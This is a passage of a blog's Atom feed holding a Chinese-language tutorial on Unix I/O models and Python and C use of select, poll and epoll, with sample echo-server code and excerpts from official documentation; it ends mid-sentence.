<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zwh-china.github.io/atom.xml" rel="self"/>
  
  <link href="https://zwh-china.github.io/"/>
  <updated>2021-05-02T18:00:25.528Z</updated>
  <id>https://zwh-china.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python IO多路复用</title>
    <link href="https://zwh-china.github.io/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <id>https://zwh-china.github.io/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</id>
    <published>2021-05-02T17:56:29.000Z</published>
    <updated>2021-05-02T18:00:25.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近正在写一个端口映射小程序。主要实现内网的端口转发功能。拿80端口的Apache举例来说，就是我在一个没有公网IP的内网建立了一个Apache服务器，但是这个web服务只能被内网访问，但是通过端口映射就能够通过有公网IP的服务器访问到本地的80端口服务</p><p>大概原理就是写了一个反向代理，通过反代数据来达到端口映射的效果。但是这种场景下单一的多线程已经满足不了我对性能的要求，进而我去了解了UNIX下的五种I/O模型，准备拿I/O多路复用的epoll来解决我的问题</p><p>最初的构想是，当服务器接到一个请求，客户端就会开一个套接字并把其放入一个线程去处理。相当于每有一个连接，我就会单独开一个线程。这样会使得程序的效率大大下降。因为在创建新线程时会涉及到上下文切换和内存的共享。所以我需要除了线程外的方法来解决这个问题</p><h2 id="Unix下五大I-O模型"><a href="#Unix下五大I-O模型" class="headerlink" title="Unix下五大I/O模型"></a>Unix下五大I/O模型</h2><ul><li><p>Blocking I/O </p></li><li><p>Non-blocking I/O </p></li><li><p>I/O multiplexing (select/poll/epoll) </p></li><li><p>Signal-driven (Sigio) </p></li><li><p>Asynchronous I/O (POSIX aio_ series functions) <img src="/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/yuque_diagram.png" alt="yuque_diagram"></p></li></ul><h3 id="阻塞式IO"><a href="#阻塞式IO" class="headerlink" title="阻塞式IO"></a>阻塞式IO</h3><p>阻塞式就是最常见的socket用法。</p><pre><code class="python">data = skt.recv(Buffer_Size)</code></pre><p>这种接收默认下是阻塞的，在运行到这个函数后会执行系统调用，即从用户态到内核态的转换。此时就会阻塞等到内核返回数据内容。</p><h3 id="非阻塞式IO"><a href="#非阻塞式IO" class="headerlink" title="非阻塞式IO"></a>非阻塞式IO</h3><p>非阻塞即设置<code>skt.setblocking(True)</code>此时套接字便不会阻塞。在每次尝试<code>recv(Buffer_Size)</code>时回去问内核有没有数据，没有数据内核会返回错误，而不是等待数据到来</p><h3 id="多路复用IO"><a href="#多路复用IO" class="headerlink" title="多路复用IO"></a>多路复用IO</h3><p>这个是这次了解的重点。</p><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><ul><li>select( )</li></ul><p><code>select</code>在python中的定义是<code>select.select(rlist, wlist, xlist[,timeout])</code>这个函数提供了直接面向Unix系统中<code>select()</code>系统调用的接口，其中前三个参数是等待对象的</p><pre><code>iterable: either integers representing file descriptors or objects with a parameterless method named fileno() returning such an integer:    rlist: wait until ready for reading    wlist: wait until ready for writing    xlist: wait for an “exceptional condition” (see the manual page for what your system considers such a condition)Empty iterables are allowed, but acceptance of three empty iterables is platform-dependent. (It is known to work on Unix but not on Windows.) The optional timeout argument specifies a time-out as a floating point number in seconds. When the timeout argument is omitted the function blocks until at least one file descriptor is ready. A time-out value of zero specifies a poll and never blocks.The return value is a triple of lists of objects that are ready: subsets of the first three arguments. When the time-out is reached without a file descriptor becoming ready, three empty lists are returned.Among the acceptable object types in the iterables are Python file objects (e.g. sys.stdin, or objects returned by open() or os.popen()), socket objects returned by socket.socket(). You may also define a wrapper class yourself, as long as it has an appropriate fileno() method (that really returns a file descriptor, not just a random integer).NoteFile objects on Windows are not acceptable, but sockets are. On Windows, the underlying select() function is provided by the WinSock library, and does not handle file descriptors that don’t originate from WinSock. </code></pre><p>说白了就是文件描述符<code>fd</code>，当然由于Python封装的特性，也可以传入套接字对象，函数会自动调用套接字对象中的<code>fileno</code>方法来间接获取<code>fd</code>这个函数在win下不能接受对象类型除了套接字对象(也就是普通的那种文件对象不行了)。然后超时参数默认是无限久也就是阻塞，如果设置超时时间，若在时间内没有获取到就会返回空List。那么也就顺便得知<code>select()</code>返回的类型是三个List。特别的如果超时时间为0，则表示直接不阻塞，说明这是一个poll。同时<code>select()</code>也是<code>select pool epool</code>中唯一可以在win上用的函数。可能是因为win下的I/O模型不同导致的。</p><p>看了别人的视屏教程我反而觉得<code>select()</code>的用法更适合用C来展现</p><p>先看<code>select()</code>的函数原型</p><pre><code class="c"> int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);</code></pre><p>可以看到<code>select()</code>函数接受一个最大文件描述符，另三个主要参数是存储了文件描述符的bitmap分别表示读，写，异常，和超时时间</p><p>再看下以socket为例子的代码</p><pre><code class="c">  fd_set rset;  sockfd = socket(AF_INET, SOCK_STREAM, 0);  memset(&amp;addr, 0, sizeof (addr));  addr.sin_family = AF_INET;  addr.sin_port = htons(2000);  addr.sin_addr.s_addr = INADDR_ANY;  bind(sockfd,(struct sockaddr*)&amp;addr ,sizeof(addr));  listen (sockfd, 5);    for (i=0;i&lt;5;i++)   &#123;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    fds[i] = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    if(fds[i] &gt; max)        max = fds[i];  &#125;    while(1)&#123;    FD_ZERO(&amp;rset);      for (i = 0; i&lt; 5; i++ ) &#123;          FD_SET(fds[i],&amp;rset);      &#125;        puts(&quot;round again&quot;);    select(max+1, &amp;rset, NULL, NULL, NULL);     for(i=0;i&lt;5;i++) &#123;        if (FD_ISSET(fds[i], &amp;rset))&#123;            memset(buffer,0,MAXBUF);            read(fds[i], buffer, MAXBUF);            puts(buffer);        &#125;    &#125;      &#125;</code></pre><p>首先是创建了一个普通的TCP监听socket设置了最大监听量是5，循环accept，直到建立了5个连接的套接字，这里注意c语言accept返回的就直接是一个<code>int</code>类型的<code>fd</code>(文件描述符)而不是Python中的socket对象。然后记录下了文件描述符的最大值。然后把文件描述符放到一个bitmap里去也就是<code>FD_SET(fds[i],&amp;rset);</code>bitmap的结构类似一个数组，默认值全是0，若收到的5个<code>fd</code>分别为 1 2 3 4 5则会在bitmap中把对应的1 2 3 4 5位由0变成1。然后调用<code>select()</code>函数，传入参数最大的<code>fd+1</code>(具体为啥要加1可以认为是bitmap是一个数组从0存储所以需要加1)和储存了文件描述符的bitmap。当<code>select()</code>返回说明有socket可以接受数据了，这中间其实是用户态把bitmap利用<code>mmap</code>映射到内核，然后由内核轮询直到发现有数据来了，便会对bitmap中的描述符置位也就是类似插一个小旗子(flag)表明是这个<code>fd</code>有数据来了，便进行遍历判断是哪一位变了，然后进行读取。这最后遍历这部在python中似乎被直接完成了，因为python的select是有返回值的，返回的便是可以<code>recv()</code>的套接字对象。从这里也能看出Python是高度封装的语言，它把这种细节封装起来，使得我们写代码不必在意细枝末节。而c虽然略显复杂，却能很好展示<code>select()</code>的处理过程。</p><p>优点：1) 在c语言中它的优点就是它轮询的过程(检测socket是否有数据可接受)是在内核中进行，而非我自己用一个非阻塞IO去while True循环来反复进行用户态-内核态切换来占用开销。</p><p>缺点，1)在32位下bitmap大小默认是1024在64位下是2048也就是bitmap大小受限 2)在每次select后还得手动遍历，有O(n)复杂度</p><p>Python样例代码</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import selectimport socketimport Queueserver = socket.socket(socket.AF_INET,socket.SOCK_STREAM)server.setblocking(False)server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR  , 1)server_address= (&#39;192.168.1.5&#39;,8080)server.bind(server_address)server.listen(10)#select轮询等待读socket集合inputs = [server]#select轮询等待写socket集合outputs = []message_queues = &#123;&#125;#select超时时间timeout = 20while True:    print &quot;等待活动连接......&quot;    readable , writable , exceptional = select.select(inputs, outputs, inputs, timeout)    if not (readable or writable or exceptional) :        print &quot;select超时无活动连接，重新select...... &quot;        continue;    #循环可读事件    for s in readable :        #如果是server监听的socket        if s is server:            #同意连接            connection, client_address = s.accept()            print &quot;新连接： &quot;, client_address            connection.setblocking(0)            #将连接加入到select可读事件队列            inputs.append(connection)            #新建连接为key的字典，写回读取到的消息            message_queues[connection] = Queue.Queue()        else:            #不是本机监听就是客户端发来的消息            data = s.recv(1024)            if data :                print &quot;收到数据：&quot; , data , &quot;客户端：&quot;,s.getpeername()                message_queues[s].put(data)                if s not in outputs:                    #将读取到的socket加入到可写事件队列                    outputs.append(s)            else:                #空白消息，关闭连接                print &quot;关闭连接：&quot;, client_address                if s in outputs :                    outputs.remove(s)                inputs.remove(s)                s.close()                del message_queues[s]    for s in writable:        try:            msg = message_queues[s].get_nowait()        except Queue.Empty:            print &quot;连接：&quot; , s.getpeername() , &#39;消息队列为空&#39;            outputs.remove(s)        else:            print &quot;发送数据：&quot; , msg , &quot;到&quot;, s.getpeername()            s.send(msg)    for s in exceptional:        print &quot;异常连接：&quot;, s.getpeername()        inputs.remove(s)        if s in outputs:            outputs.remove(s)        s.close()        del message_queues[s]</code></pre><h2 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h2><ul><li><p>pool( )</p><pre><code>The poll() system call, supported on most Unix systems, provides better scalability for network servers that service many, many clients at the same time. poll() scales better because the system call only requires listing the file descriptors of interest, while select() builds a bitmap, turns on bits for the fds of interest, and then afterward the whole bitmap has to be linearly scanned again. select() is O(highest file descriptor), while poll() is O(number of file descriptors)</code></pre><p>在python文档里也直接讲明了效率的差异在大部分情况下poll比select更好。因为<code>poll()</code>的系统调用只需要一个感兴趣也就是需要监听的文件描述符清单。而非是像<code>select()</code>一样需要建立一个bitmap并且需要对整个bitmap进行线性扫描。</p><p>先看看<code>poll()</code>的c语言函数原型</p><pre><code class="c">int poll (struct pollfd *fds, unsigned int nfds, int timeout);</code></pre></li></ul><p>明显比<code>select()</code>简洁不少，它接收一个有关文件描述符的结构体，一个正整数表示文件描述符数量，和一个超时时间</p><p>再看下样例代码</p><pre><code class="c">struct pollfd &#123;      int fd;      short events;       short revents;&#125;;for (i=0;i&lt;5;i++)   &#123;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    pollfds[i].fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    pollfds[i].events = POLLIN;  &#125;  sleep(1);  while(1)&#123;      puts(&quot;round again&quot;);    poll(pollfds, 5, 50000);     for(i=0;i&lt;5;i++) &#123;        if (pollfds[i].revents &amp; POLLIN)&#123;            pollfds[i].revents = 0;            memset(buffer,0,MAXBUF);            read(pollfds[i].fd, buffer, MAXBUF);            puts(buffer);        &#125;    &#125;  &#125;</code></pre><p>对于每一个文件描述符，我们都为其创建一个pollfd对象，其中fd参数就是文件描述符，events表示poll事件，是预定好的</p><table><thead><tr><th>事件</th><th>描述</th><th>是否可作为输入（events）</th><th>是否可作为输出（revents）</th></tr></thead><tbody><tr><td>POLLIN</td><td>数据可读（包括普通数据&amp;优先数据）</td><td>是</td><td>是</td></tr><tr><td>POLLOUT</td><td>数据可写（普通数据&amp;优先数据）</td><td>是</td><td>是</td></tr><tr><td>POLLRDNORM</td><td>普通数据可读</td><td>是</td><td>是</td></tr><tr><td>POLLRDBAND</td><td>优先级带数据可读（linux不支持）</td><td>是</td><td>是</td></tr><tr><td>POLLPRI</td><td>高优先级数据可读，比如TCP带外数据</td><td>是</td><td>是</td></tr><tr><td>POLLWRNORM</td><td>普通数据可写</td><td>是</td><td>是</td></tr><tr><td>POLLWRBAND</td><td>优先级带数据可写</td><td>是</td><td>是</td></tr><tr><td>POLLRDHUP</td><td>TCP连接被对端关闭，或者关闭了写操作，由GNU引入</td><td>是</td><td>是</td></tr><tr><td>POPPHUP</td><td>挂起</td><td>否</td><td>是</td></tr><tr><td>POLLERR</td><td>错误</td><td>否</td><td>是</td></tr><tr><td>POLLNVAL</td><td>文件描述符没有打开</td><td>否</td><td>是</td></tr></tbody></table><p>调用<code>poll()</code>后阻塞，若返回只需要遍历遍历文件描述符数量，将其<code>revents</code>重置为0，并对对应fd进行读取。</p><h4 id="Poll-vs-Select"><a href="#Poll-vs-Select" class="headerlink" title="Poll vs Select"></a>Poll vs Select</h4><ul><li>poll( ) does not require that the user calculate the value of the highest- numbered file descriptor +1</li><li>poll( ) is more efficient for large-valued file descriptors. Imagine watching a single file descriptor with the value 900 via select()—the  kernel would have to check each bit of each passed-in set, up to the  900th bit.</li><li>select( )’s file descriptor sets are statically sized.</li><li>With select( ), the file descriptor sets are reconstructed on  return, so each subsequent call must reinitialize them. The poll( )  system call separates the input (events field) from the output (revents  field), allowing the array to be reused without change.</li><li>The timeout parameter to select( ) is undefined on return. Portable  code needs to reinitialize it. This is not an issue with pselect( )</li><li>select( ) is more portable, as some Unix systems do not support poll( )</li></ul><p>这里其实还有一点，相较于之前的select，select每次需要构建一个bitmap，当每次select返回后，由于内核的置位，导致bitmap被直接更改了，所以再下次select前，必须重新初始化bitmap。这就造成其重用性较差。但是poll就不一样，我们只需要在处理文件描述符的时候顺手把revents给重新变为0即可。还有一点就是select的bitmap在被返回前所有没收到数据的位都被置为0，所以相当于其本身被改变了，所以没法类似poll这样给它变为0，只能乖乖重新生成。</p><p>再看Python对poll描述的官方文档</p><ul><li><p><code>poll.register</code>(<em>fd</em>[, <em>eventmask</em>])</p><p>Register a file descriptor with the polling object.  Future calls to the <a href="https://docs.python.org/3/library/select.html#select.poll"><code>poll()</code></a> method will then check whether the file descriptor has any pending I/O events.  <em>fd</em> can be either an integer, or an object with a <a href="https://docs.python.org/3/library/io.html#io.IOBase.fileno"><code>fileno()</code></a> method that returns an integer.  File objects implement <code>fileno()</code>, so they can also be used as the argument. <em>eventmask</em> is an optional bitmask describing the type of events you want to check for, and can be a combination of the constants <code>POLLIN</code>, <code>POLLPRI</code>, and <code>POLLOUT</code>, described in the table below.  If not specified, the default value used will check for all 3 types of events.    Constant Meaning  <code>POLLIN</code> There is data to read <code>POLLPRI</code> There is urgent data to read <code>POLLOUT</code> Ready for output: writing will not block <code>POLLERR</code> Error condition of some sort <code>POLLHUP</code> Hung up <code>POLLRDHUP</code> Stream socket peer closed connection, or shut down writing half of connection <code>POLLNVAL</code> Invalid request: descriptor not open  Registering a file descriptor that’s already registered is not an error, and has the same effect as registering the descriptor exactly once.</p></li><li><p><code>poll.modify</code>(<em>fd</em>, <em>eventmask</em>)</p><p>Modifies an already registered fd. This has the same effect as <code>register(fd, eventmask)</code>.  Attempting to modify a file descriptor that was never registered causes an <a href="https://docs.python.org/3/library/exceptions.html#OSError"><code>OSError</code></a> exception with errno <code>ENOENT</code> to be raised.</p><table><thead><tr><th>Constant</th><th>Meaning</th></tr></thead><tbody><tr><td><code>POLLIN</code></td><td>There is data to read</td></tr><tr><td><code>POLLPRI</code></td><td>There is urgent data to read</td></tr><tr><td><code>POLLOUT</code></td><td>Ready for output: writing will not block</td></tr><tr><td><code>POLLERR</code></td><td>Error condition of some sort</td></tr><tr><td><code>POLLHUP</code></td><td>Hung up</td></tr><tr><td><code>POLLRDHUP</code></td><td>Stream socket peer closed connection, or shut down writing half of connection</td></tr><tr><td><code>POLLNVAL</code></td><td>Invalid request: descriptor not open</td></tr></tbody></table></li><li><p><code>poll.unregister</code>(<em>fd</em>)</p><p>Remove a file descriptor being tracked by a polling object.  Just like the <a href="https://docs.python.org/3/library/select.html#select.poll.register"><code>register()</code></a> method, <em>fd</em> can be an integer or an object with a <a href="https://docs.python.org/3/library/io.html#io.IOBase.fileno"><code>fileno()</code></a> method that returns an integer. Attempting to remove a file descriptor that was never registered causes a <a href="https://docs.python.org/3/library/exceptions.html#KeyError"><code>KeyError</code></a> exception to be raised.</p></li><li><p><code>poll.poll</code>([<em>timeout</em>])</p><p>Polls the set of registered file descriptors, and returns a possibly-empty list containing <code>(fd, event)</code> 2-tuples for the descriptors that have events or errors to report. <em>fd</em> is the file descriptor, and <em>event</em> is a bitmask with bits set for the reported events for that descriptor — <code>POLLIN</code> for waiting input, <code>POLLOUT</code> to indicate that the descriptor can be written to, and so forth. An empty list indicates that the call timed out and no file descriptors had any events to report. If <em>timeout</em> is given, it specifies the length of time in milliseconds which the system will wait for events before returning. If <em>timeout</em> is omitted, negative, or <a href="https://docs.python.org/3/library/constants.html#None"><code>None</code></a>, the call will block until there is an event for this poll object. Changed in version 3.5: The function is now retried with a recomputed timeout when interrupted by a signal, except if the signal handler raises an exception (see <a href="https://www.python.org/dev/peps/pep-0475"><strong>PEP 475</strong></a> for the rationale), instead of raising <a href="https://docs.python.org/3/library/exceptions.html#InterruptedError"><code>InterruptedError</code></a>.</p><p>首先需要去<code>poll.register()</code>一下，参数自然是文件描述符和event，然后特殊的，如果不指定event则会三种event都会被作为默认参数传入。<code>poll.modify()</code>就是去修改已经被<code>poll.register()</code>的文件描述符。至于<code>poll.unregister()</code>就不说了，取消一个已经注册的文件描述符。最后万事俱备，都注册完了就去调用<code>poll.poll()</code>去监测。其中的超时默认是阻塞，如果显式传入负数或者None也会是阻塞的，默认单位是毫秒。</p><p>Python2样例代码</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import socketimport selectimport Queueserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.setblocking(False)server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server_address = (&quot;192.168.1.5&quot;, 8080)server.bind(server_address)server.listen(5)print  &quot;服务器启动成功，监听IP：&quot; , server_addressmessage_queues = &#123;&#125;#超时，毫秒timeout = 5000#监听哪些事件READ_ONLY = ( select.POLLIN | select.POLLPRI | select.POLLHUP | select.POLLERR)READ_WRITE = (READ_ONLY|select.POLLOUT)#新建轮询事件对象poller = select.poll()#注册本机监听socket到等待可读事件事件集合poller.register(server,READ_ONLY)#文件描述符到socket映射fd_to_socket = &#123;server.fileno():server,&#125;while True:    print &quot;等待活动连接......&quot;    #轮询注册的事件集合    events = poller.poll(timeout)    if not events:      print &quot;poll超时，无活动连接，重新poll......&quot;      continue    print &quot;有&quot; , len(events), &quot;个新事件，开始处理......&quot;    for fd ,flag in events:        s = fd_to_socket[fd]        #可读事件        if flag &amp; (select.POLLIN | select.POLLPRI) :            if s is server :                #如果socket是监听的server代表有新连接                connection , client_address = s.accept()                print &quot;新连接：&quot; , client_address                connection.setblocking(False)                fd_to_socket[connection.fileno()] = connection                #加入到等待读事件集合                poller.register(connection,READ_ONLY)                message_queues[connection]  = Queue.Queue()            else :                #接收客户端发送的数据                data = s.recv(1024)                if data:                    print &quot;收到数据：&quot; , data , &quot;客户端：&quot; , s.getpeername()                    message_queues[s].put(data)                    #修改读取到消息的连接到等待写事件集合                    poller.modify(s,READ_WRITE)                else :                    # Close the connection                    print &quot;  closing&quot; , s.getpeername()                    # Stop listening for input on the connection                    poller.unregister(s)                    s.close()                    del message_queues[s]        #连接关闭事件        elif flag &amp; select.POLLHUP :            print &quot; Closing &quot;, s.getpeername() ,&quot;(HUP)&quot;            poller.unregister(s)            s.close()        #可写事件        elif flag &amp; select.POLLOUT :            try:                msg = message_queues[s].get_nowait()            except Queue.Empty:                print s.getpeername() , &quot; queue empty&quot;                poller.modify(s,READ_ONLY)            else :                print &quot;发送数据：&quot; , data , &quot;客户端：&quot; , s.getpeername()                s.send(msg)        #异常事件        elif flag &amp; select.POLLERR:            print &quot;  exception on&quot; , s.getpeername()            poller.unregister(s)            s.close()            del message_queues[s]</code></pre></li></ul><h2 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h2><p>epoll在c语言下主要由三个比较主要的函数组成<code>epoll_create()</code>、<code>epoll_ctl</code>、<code>epoll_wait()</code>组成。限于篇幅原因，不列出其函数原型。可以参考<a href="https://blog.csdn.net/silly1195056983/article/details/112692781">https://blog.csdn.net/silly1195056983/article/details/112692781</a></p><p>看下c语言给的样例</p><pre><code class="c">struct epoll_event events[5];  int epfd = epoll_create(10);  ...  ...  for (i=0;i&lt;5;i++)   &#123;    static struct epoll_event ev;    memset(&amp;client, 0, sizeof (client));    addrlen = sizeof(client);    ev.data.fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen);    ev.events = EPOLLIN;    epoll_ctl(epfd, EPOLL_CTL_ADD, ev.data.fd, &amp;ev);   &#125;    while(1)&#123;      puts(&quot;round again&quot;);      nfds = epoll_wait(epfd, events, 5, 10000);        for(i=0;i&lt;nfds;i++) &#123;            memset(buffer,0,MAXBUF);            read(events[i].data.fd, buffer, MAXBUF);            puts(buffer);    &#125;  &#125;</code></pre><p>先用<code>epoll_create()</code>创建10个位置，用于监听文件描述符。再用类似poll的结构体存储fd和监听事件，注意这里没有revents，然后调用<code>epoll_ctl()</code>传入<code>epoll_create()</code>创建的监听列表，设置增加操作类型，传入文件描述符和事件类型。然后重复5次，表明监听5个socket文件描述符，然后调用<code>epoll_wait()</code>来进行阻塞等待，等待完后，只需要遍历<code>epoll_wait()</code>返回的序号进行对应读取。不需要像poll一样重置事件。</p><h4 id="Epoll-vs-Select-Poll"><a href="#Epoll-vs-Select-Poll" class="headerlink" title="Epoll vs Select/Poll"></a><strong>Epoll vs Select/Poll</strong></h4><ul><li>We can add and remove file descriptor while waiting</li><li>epoll_wait returns only the objects with ready file descriptors</li><li>epoll has better performance – O(1) instead of O(n)</li><li>epoll can behave as level triggered or edge triggered (see man page)</li><li>epoll is Linux specific so non portable</li></ul><p>其实<code>epoll_create()</code>创建的是一个红黑树，<code>epoll_ctl()</code>是对红黑树进行操作。这里的置位操作也有但是和poll()不太一样，因为epoll()没有revents。这里具体是如何操作的回头学了再补上，我看的视频对这个部分具体如何置位有争议。然后还有就是，这个给的例子是epoll()的水平触发还有一种边缘触发。这个似乎挺复杂的记录几个讲这个的url。回头去看</p><p><a href="https://blog.csdn.net/qq_34793133/article/details/82055915">https://blog.csdn.net/qq_34793133/article/details/82055915</a></p><p><a href="https://zhuanlan.zhihu.com/p/107995399">https://zhuanlan.zhihu.com/p/107995399</a></p><p>具体用c来说设置水平触发和边缘触发是在</p><pre><code class="c">//水平触发evt.events = EPOLLIN;    // LT 水平触发 (默认) EPOLLLTevt.data.fd = pfd[0];//边沿触发evt.events = EPOLLIN | EPOLLET;    // ET 边沿触发evt.data.fd = pfd[0];</code></pre><p>LT/ET应该就是分别代表，Level Trigger和Edge Trigger，也就是在设置事件和传入<code>epoll_ctl()</code>时设置。</p><p>至于这俩有啥区别和什么时候用，上面放的两个url中CSDN的标题就是<code>浅析epoll的水平触发和边缘触发，以及边缘触发为什么要使用非阻塞IO</code>这里再引用部分作者的文章内容</p><pre><code>我们通俗一点讲：Level_triggered(水平触发)：当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据一次性全部读写完(如读写缓冲区太小)，那么下次调用 epoll_wait()时，它还会通知你在上没读写完的文件描述符上继续读写，当然如果你一直不去读写，它会一直通知你！！！如果系统中有大量你不需要读写的就绪文件描述符，而它们每次都会返回，这样会大大降低处理程序检索自己关心的就绪文件描述符的效率！！！Edge_triggered(边缘触发)：当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据全部读写完(如读写缓冲区太小)，那么下次调用epoll_wait()时，它不会通知你，也就是它只会通知你一次，直到该文件描述符上出现第二次可读写事件才会通知你！！！这种模式比水平触发效率高，系统不会充斥大量你不关心的就绪文件描述符！！！阻塞IO：当你去读一个阻塞的文件描述符时，如果在该文件描述符上没有数据可读，那么它会一直阻塞(通俗一点就是一直卡在调用函数那里)，直到有数据可读。当你去写一个阻塞的文件描述符时，如果在该文件描述符上没有空间(通常是缓冲区)可写，那么它会一直阻塞，直到有空间可写。以上的读和写我们统一指在某个文件描述符进行的操作，不单单指真正的读数据，写数据，还包括接收连接accept()，发起连接connect()等操作...非阻塞IO：当你去读写一个非阻塞的文件描述符时，不管可不可以读写，它都会立即返回，返回成功说明读写操作完成了，返回失败会设置相应errno状态码，根据这个errno可以进一步执行其他处理。它不会像阻塞IO那样，卡在那里不动！！！</code></pre><p>再看Python官方文档对epoll的介绍</p><h2 id="Edge-and-Level-Trigger-Polling-epoll-Objects"><a href="#Edge-and-Level-Trigger-Polling-epoll-Objects" class="headerlink" title="Edge and Level Trigger Polling (epoll) Objects"></a>Edge and Level Trigger Polling (epoll) Objects</h2><blockquote><p><a href="https://linux.die.net/man/4/epoll">https://linux.die.net/man/4/epoll</a></p><p><em>eventmask</em></p><table><thead><tr><th>Constant</th><th>Meaning</th></tr></thead><tbody><tr><td><code>EPOLLIN</code></td><td>Available for read</td></tr><tr><td><code>EPOLLOUT</code></td><td>Available for write</td></tr><tr><td><code>EPOLLPRI</code></td><td>Urgent data for read</td></tr><tr><td><code>EPOLLERR</code></td><td>Error condition happened on the assoc. fd</td></tr><tr><td><code>EPOLLHUP</code></td><td>Hang up happened on the assoc. fd</td></tr><tr><td><code>EPOLLET</code></td><td>Set Edge Trigger behavior, the default is Level Trigger behavior</td></tr><tr><td><code>EPOLLONESHOT</code></td><td>Set one-shot behavior. After one event is pulled out, the fd is internally disabled</td></tr><tr><td><code>EPOLLEXCLUSIVE</code></td><td>Wake only one epoll object when the associated fd has an event. The default (if this flag is not set) is to wake all epoll objects polling on a fd.</td></tr><tr><td><code>EPOLLRDHUP</code></td><td>Stream socket peer closed connection or shut down writing half of connection.</td></tr><tr><td><code>EPOLLRDNORM</code></td><td>Equivalent to <code>EPOLLIN</code></td></tr><tr><td><code>EPOLLRDBAND</code></td><td>Priority data band can be read.</td></tr><tr><td><code>EPOLLWRNORM</code></td><td>Equivalent to <code>EPOLLOUT</code></td></tr><tr><td><code>EPOLLWRBAND</code></td><td>Priority data may be written.</td></tr><tr><td><code>EPOLLMSG</code></td><td>Ignored.</td></tr></tbody></table><p>New in version 3.6: <code>EPOLLEXCLUSIVE</code> was added.  It’s only supported by Linux Kernel 4.5 or later.</p></blockquote><ul><li><p><code>epoll.close()</code></p><p>Close the control file descriptor of the epoll object.</p></li><li><p><code>epoll.closed()</code></p><p>True if the epoll object is closed.</p></li><li><p><code>epoll.fileno()</code></p><p>Return the file descriptor number of the control fd.</p></li><li><p><code>epoll.fromfd</code>(<em>fd</em>)</p><p>Create an epoll object from a given file descriptor.</p></li><li><p><code>epoll.register</code>(<em>fd</em>[, <em>eventmask</em>])</p><p>Register a fd descriptor with the epoll object.</p></li><li><p><code>epoll.modify</code>(<em>fd</em>, <em>eventmask</em>)</p><p>Modify a registered file descriptor.</p></li><li><p><code>epoll.unregister</code>(<em>fd</em>)</p><p>Remove a registered file descriptor from the epoll object. Changed in version 3.9: The method no longer ignores the <a href="https://docs.python.org/3/library/errno.html#errno.EBADF"><code>EBADF</code></a> error.</p></li><li><p><code>epoll.poll</code>(<em>timeout=None</em>, <em>maxevents=-1</em>)</p><p>Wait for events. timeout in seconds (float)</p><p>感觉有点抽象，看一个样例代码吧</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import socket, selectimport Queueserversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server_address = (&quot;192.168.1.5&quot;, 8080)serversocket.bind(server_address)serversocket.listen(1)print  &quot;服务器启动成功，监听IP：&quot; , server_addressserversocket.setblocking(0)timeout = 10#新建epoll事件对象，后续要监控的事件添加到其中epoll = select.epoll()#添加服务器监听fd到等待读事件集合epoll.register(serversocket.fileno(), select.EPOLLIN)message_queues = &#123;&#125;fd_to_socket = &#123;serversocket.fileno():serversocket,&#125;while True:  print &quot;等待活动连接......&quot;  #轮询注册的事件集合  events = epoll.poll(timeout)  if not events:     print &quot;epoll超时无活动连接，重新轮询......&quot;     continue  print &quot;有&quot; , len(events), &quot;个新事件，开始处理......&quot;  for fd, event in events:     socket = fd_to_socket[fd]     #可读事件     if event &amp; select.EPOLLIN:         #如果活动socket为服务器所监听，有新连接         if socket == serversocket:            connection, address = serversocket.accept()            print &quot;新连接：&quot; , address            connection.setblocking(0)            #注册新连接fd到待读事件集合            epoll.register(connection.fileno(), select.EPOLLIN)            fd_to_socket[connection.fileno()] = connection            message_queues[connection]  = Queue.Queue()         #否则为客户端发送的数据         else:            data = socket.recv(1024)            if data:               print &quot;收到数据：&quot; , data , &quot;客户端：&quot; , socket.getpeername()               message_queues[socket].put(data)               #修改读取到消息的连接到等待写事件集合               epoll.modify(fd, select.EPOLLOUT)     #可写事件     elif event &amp; select.EPOLLOUT:        try:           msg = message_queues[socket].get_nowait()        except Queue.Empty:           print socket.getpeername() , &quot; queue empty&quot;           epoll.modify(fd, select.EPOLLIN)        else :           print &quot;发送数据：&quot; , data , &quot;客户端：&quot; , socket.getpeername()           socket.send(msg)     #关闭事件     elif event &amp; select.EPOLLHUP:        epoll.unregister(fd)        fd_to_socket[fd].close()        del fd_to_socket[fd]epoll.unregister(serversocket.fileno())epoll.close()serversocket.close()</code></pre></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结就是，至少在python下select的兼容性比较好，在Linux和Win下都是通用的。然后一般来说poll和epoll用的比select多。因为在很多方面这俩都比select更好。同时我也了解到了数据结构的实际应用，因为poll和epoll中应用了bitmap 